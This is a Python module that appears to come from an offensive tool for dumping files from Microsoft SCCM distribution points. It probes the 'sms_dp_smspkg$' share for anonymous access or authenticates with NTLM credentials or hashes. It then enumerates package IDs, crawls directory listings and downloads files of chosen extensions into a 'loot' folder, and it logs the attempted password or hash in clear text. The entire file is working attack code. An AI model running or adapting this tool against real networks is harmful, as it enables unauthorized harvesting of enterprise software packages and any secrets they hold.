import os
import string
import random
import urllib
import logging
import requests
import traceback

from requests_ntlm              import HttpNtlmAuth
from bs4                        import BeautifulSoup
from conf                       import bcolors, ANONYMOUSDP, DP_DOWNLOAD_HEADERS

logger = logging.getLogger(__name__)


class FileDumper():

    def __init__(self, distribution_point,
                 output_dir,
                 extensions,
                 anonymous,
                 urls,
                 recursion_depth,
                 username,
                 password
                ):
        self.distribution_point = distribution_point
        self.output_dir = output_dir
        self.extensions = extensions
        self.anonymous = anonymous
        self.urls = urls
        self.recursion_depth = recursion_depth
        self.username = username
        self.password = password
        self.package_ids = set()

        self.session = requests.Session()
        self.session.headers.update(DP_DOWNLOAD_HEADERS)
        if username is not None and password is not None:
            self.session.auth = HttpNtlmAuth(username, password)


    @staticmethod
    def print_tree(d, out, prefix=""):
        keys = list(d.keys())
        for i, key in enumerate(keys):
            is_last = (i == len(keys) - 1)
            if isinstance(d[key], dict):
                out.write(f"{prefix}{'└── ' if is_last else '├── '}{key}/\n")
                new_prefix = f"{prefix}{'    ' if is_last else '│   '}"
                FileDumper.print_tree(d[key], out, new_prefix)
            else:
                out.write(f"{prefix}{'└── ' if is_last else '├── '}{key}\n")


    @staticmethod
    def check_anonymous_DP_connection_enabled(distribution_point):
        characters = string.ascii_letters
        random_string = ''.join(random.choice(characters) for i in range(8))

        logger.info(f"[INFO] Checking anonymous DP Connection with URL {distribution_point}/sms_dp_smspkg$/{random_string}")
        r = requests.get(f"{distribution_point}/sms_dp_smspkg$/{random_string}", headers=DP_DOWNLOAD_HEADERS)
        logger.info(f"[INFO] Request returned status code {r.status_code}")
        if r.status_code == 404:
            return ANONYMOUSDP.ENABLED.value
        elif r.status_code == 401:
            return ANONYMOUSDP.DISABLED.value
        else:
            return ANONYMOUSDP.UNKNOWN.value


    def check_credentials_before_download(self):
        characters = string.ascii_letters
        random_string = ''.join(random.choice(characters) for i in range(8))
        logger.info(f"[INFO] Checking credentials with URL {self.distribution_point}/sms_dp_smspkg$/{random_string}")
        r = self.session.get(f"{self.distribution_point}/sms_dp_smspkg$/{random_string}")
        logger.info(f"[INFO] Request returned status code {r.status_code}")
        if r.status_code == 404:
            return True
        else:
            return False


    def recursive_package_directory_fetch(self, object, directory, depth):
        depth += 1
        r = self.session.get(directory)
        soup = BeautifulSoup(r.content, 'html.parser')
        files = []
        for href in soup.find_all('a'):
            previous_sibling = href.find_previous_sibling(string=True)
            if previous_sibling and 'dir' in previous_sibling:
                if depth <= self.recursion_depth:
                    object[href.get('href')] = {}
                    self.recursive_package_directory_fetch(object[href.get('href')], href.get('href'), depth)
                else:
                    logger.info("[INFO] Reached recursion depth limit")
                    object[href.get('href')]  = "Not entering this subdirectory - recursion depth limit reached"
            else:
                files.append(href.get('href'))
        for file in files:
            object[file] = None


    def recursive_file_extract(self, data):
        to_download = []
        if isinstance(data, dict):
            for key, value in data.items():
                if value is None and key.endswith(tuple(self.extensions)):
                    to_download.append(key)
                else:
                    to_download.extend(self.recursive_file_extract(data[key]))
        return to_download
    

    def download_files(self, files):
        for file in files:
            try:
                parsed_url = urllib.parse.urlparse(file)
                filename = '__'.join(parsed_url.path.split('/')[3:])
                package = parsed_url.path.split('/')[2]
                r = self.session.get(file)
                output_file = f"loot/{self.output_dir}/packages/{package}/{filename}"
                with open(output_file, 'wb') as f:
                    f.write(r.content)
                logger.warning(f"[*] Package {package} - downloaded file {filename}")
            except:
                logger.error(f"{bcolors.FAIL}[!] (Skipping) Error when handling the following file: {file}{bcolors.ENDC}")
                traceback.print_exc()
    

    def download_target_files(self):
        if self.urls is not None:
            with open(self.urls, 'r') as f:
                contents = f.read().splitlines()
            package_ids = set()
            to_download = []
            for file in contents:
                try:
                    package_ids.add(urllib.parse.urlparse(file).path.split('/')[2])
                    if file.strip() is not None: to_download.append(file) 
                except:
                    logger.error(f"{bcolors.FAIL}[!] (Skipping) URL has wrong format: {file}{bcolors.ENDC}")
                    continue
            for package_id in package_ids:
                os.makedirs(f'loot/{self.output_dir}/packages/{package_id}', exist_ok=True)
            self.download_files(to_download)
        else:
            self.handle_packages()
    

    def fetch_package_ids_from_datalib(self):       
        r = self.session.get(f"{self.distribution_point}/sms_dp_smspkg$/datalib")
        soup = BeautifulSoup(r.content, 'html.parser')
        for a in soup.find_all('a'):
            parts = a.get('href').split('/')
            last_part = parts[-1].strip()
            if not last_part.endswith('.INI'):
                self.package_ids.add(last_part)
            
        logger.warning(f"{bcolors.OKGREEN}[+] Found {len(self.package_ids)} packages{bcolors.ENDC}")
        logger.warning(self.package_ids)


    def handle_packages(self):
        with open(f"loot/{self.output_dir}/index.txt", "a") as f:
            for i, package_id in enumerate(self.package_ids):
                package_index = {package_id: {}}
                self.recursive_package_directory_fetch(package_index[package_id], f"{self.distribution_point}/sms_dp_smspkg$/{package_id}", 0)
                FileDumper.print_tree(package_index, f)
                to_download = self.recursive_file_extract(package_index[package_id])
                if len(to_download) == 0:
                    print(f"{bcolors.BOLD}[*] Handled package {package_id} ({i+1}/{len(self.package_ids)}){bcolors.ENDC}", end='\r')
                    continue
                os.makedirs(f'loot/{self.output_dir}/packages/{package_id}', exist_ok=True)
                self.download_files(to_download)
                print(f"{bcolors.BOLD}[*] Handled package {package_id} ({i+1}/{len(self.package_ids)}){bcolors.ENDC}", end='\r')
        logger.warning("\n[+] Package handling complete")


    def dump_files(self):
        if self.anonymous == ANONYMOUSDP.ENABLED.value:
            logger.warning(f"[*] Anonymous Distribution Point connection is enabled. Dumping without authentication.")
            if self.urls is None:
                self.fetch_package_ids_from_datalib()
                logger.warning(f"{bcolors.OKCYAN}\n[*] Starting unauthenticated file download with target extensions {self.extensions}{bcolors.ENDC}")
            else:
                logger.warning(f"{bcolors.OKCYAN}\n[*] Starting unauthenticated file download from URLs in '{self.urls}'{bcolors.ENDC}")
            self.download_target_files()
        else:
            result = self.check_credentials_before_download()
            if result is not True:
                logger.warning(f"{bcolors.FAIL}[-] It seems like provided credentials do not allow to successfully authenticate to distribution point.{bcolors.ENDC}")
                logger.warning(f"{bcolors.FAIL}Potential explanations: HTTPS enforced on distribution point ; wrong credentials ; NTLM disabled.{bcolors.ENDC}")
                logger.warning(f"{bcolors.FAIL}Attempted username: '{self.username}' - attempted password/hash: '{self.password}{bcolors.ENDC}'")
                return
            if self.urls is None:
                self.fetch_package_ids_from_datalib()
                logger.warning(f"{bcolors.OKCYAN}\n[*] Starting authenticated file download with target extensions {self.extensions}{bcolors.ENDC}")
            else:
                logger.warning(f"{bcolors.OKCYAN}\n[*] Starting authenticated file download from URLs in '{self.urls}'{bcolors.ENDC}")
            self.download_target_files()
